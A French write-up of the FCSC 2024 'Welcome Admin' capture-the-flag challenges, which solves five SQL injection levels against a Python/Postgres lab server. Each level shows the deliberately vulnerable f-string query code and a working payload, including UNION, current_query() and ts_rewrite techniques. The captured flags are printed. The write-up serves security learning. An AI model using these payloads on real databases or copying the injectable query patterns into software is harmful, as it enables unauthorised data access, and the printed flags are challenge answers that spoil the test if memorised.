# FCSC 2024
## Challenges :
Welcome Admin 1/2  
Welcome Admin 2/2

## Thème : Injection de SQL
## Welcome Admin 1/2  
Au cœur d'un réseau labyrinthique, là où la lumière des écrans peine à éclairer les recoins les plus sombres, une demande spéciale est lancée dans les abîmes, un appel discret, attendu seulement par ceux qui connaissent les profondeurs. Seul un véritable expert pourra répondre à l'appel, cryptiquement formulé : "Un expert en SQL est demandé à la caisse numéro 3."

## Welcome Admin 2/2
Au cœur d'un réseau labyrinthique, là où la lumière des écrans peine à éclairer les recoins les plus sombres, une demande spéciale est lancée dans les abîmes, un appel discret, attendu seulement par ceux qui connaissent les profondeurs. Seul un véritable expert pourra répondre à l'appel, cryptiquement formulé : "Un expert en SQL est demandé à la caisse numéro 3."

URL du serveur : https://welcome-admin.france-cybersecurity-challenge.fr/
Lien du serveur de l’archive container : 
https://france-cybersecurity-challenge.fr/files/e8c67b40e1e1a23305e8592a647e5756/welcome-admin.tar.xz?token=eyJ1c2VyX2lkIjozNDEsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE4OH0.Zhz9kg.gxNsCVdWeE4J0Wck30a0B0YfEbU

## Analyse des sources :
Serveur web écrit en Python avec une base Postgres
On peut le lancer en locale : 
docker-compose up --build
Le serveur est alors disponible en 127.0.0.1 :8000

Le code est assez simple , il y a 5 url qui correspondent aux 5 niveaux d’administration. 
Chaque niveau d’administration correspond à une injection SQL plus ou moins tordu	




## Level 1 :
Code python :
'''python
cursor.execute(f"SELECT '{token}' = '{password}'")
'''

Injection :
'''
' OR '1' = '1
'''

Flag : FCSC{94738150696e2903c924f0079bd95cd8256c648314654f32d6aaa090846a8af5}

## Level 2 :
Code python :
'''python

  cursor.execute(
        f"""
            CREATE FUNCTION check_password(_password text) RETURNS text
            AS $$
                BEGIN
                    IF _password = '{token}' THEN
                        RETURN _password;
                    END IF;
                    RETURN 'nope';
                END;
            $$ 
            IMMUTABLE LANGUAGE plpgsql;
        """
    )
    cursor.execute(f"SELECT  check_password('{password}')")
'''

La problématique est d’afficher le mot de passe aléatoire de la procédure. 
On utilise la table pg_proc & on fait un substring pour récupérer la valeur.

Injection :
'''
t')  UNION (select SUBSTRING(pg_get_functiondef(oid) FROM 178 FOR 32) from pg_proc where proname = 'check_password') LIMIT ('2
'''

## Level 3 :
Code python :
'''python

cursor.execute(f"SELECT '{token}', '{password}';")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 2:
        return False
    return row[1] == token
'''

La problématique est ici assez tordue. Il faut que la deuxième de la colonne de requête soit régale au token.
En explorant les fonctions tordu de la doc de postgres, je suis tombé sur current_query() qui permet de récupérer cette requête.
Injection :
'''
' || SUBSTRING(current_query() FROM 9 FOR 32) --
'''

## Level 4 :
Code python :
'''python

cursor.execute(f"""SELECT md5(random()::text), '{password}';""")
'''

Il est probablement impossible de deviner le md5(random() ::text)
Le plus est donc de faire qu’on injecte une nouvelle ligne de données et on ignore la première avec le UNION SELECT … OFFSET

Injection :
'''

' UNION SELECT 'toto', 'toto' OFFSET 1 –
'''


## Level 5 :
Code python :
'''python

@app.route("/turbo-admin", methods=["GET", "POST"])
@login_for(Rank.TURBO_ADMIN, Rank.FLAG, "/flag")
def level5(cursor: cursor, password: str):
    table_name = "table_" + os.urandom(16).hex()
    col_name = "col_" + os.urandom(16).hex()
    token = os.urandom(16).hex()

    cursor.execute(
        f"""
        CREATE TABLE "{table_name}" (
          id serial PRIMARY KEY,
          "{col_name}" text
        );

        INSERT INTO "{table_name}"("{col_name}") VALUES ('{token}');
        """
    )
    cursor.execute(f"SELECT '{password}';")
    row = cursor.fetchone()
    print(row)
    if not row:
        return False
    if len(row) != 1:
        return False
    return row[0] == token
'''


Le token, le plus tordu à récupérer.  Il est stocké dans une table avec un nom aléatoire et un nom de colonne aléatoire avec un contenu aléatoire.
Difficulté, on ne peut pas normalement pas faire de requête avec des nom variabilisé.
Il me fallait donc un sorte de fonction eval qui consomme un string pouvant contenir une requête.
Je suis tombé sur les ts_rewrite , to_tsquery dans la doc. 
Recherche rapide sur google pour trouver exemple d’utilisation sous forme d’exploit. Je tombe sur :
https://www.synacktiv.com/publications/dont-fear-the-bark-tsrewrite-to-dodge-the-mark

Le job est presque fait :
Injection :
'''

' UNION SELECT SUBSTRING(CAST(ts_rewrite('lock', 'SELECT to_tsquery(''lock''), to_tsquery(' || (SELECT column_name || ') FROM ' || table_name FROM information_schema.columns WHERE column_name like 'col\_%' and table_name like 'table\_%' LIMIT 1)) AS TEXT)||'', 2, 32) OFFSET 1  --

'''

Enfin, le flag :
'''
FCSC{a380e590ae8ffe8da9bb86f27d05203b7f9d32dd37c833c2764097840848b3a2}
'''
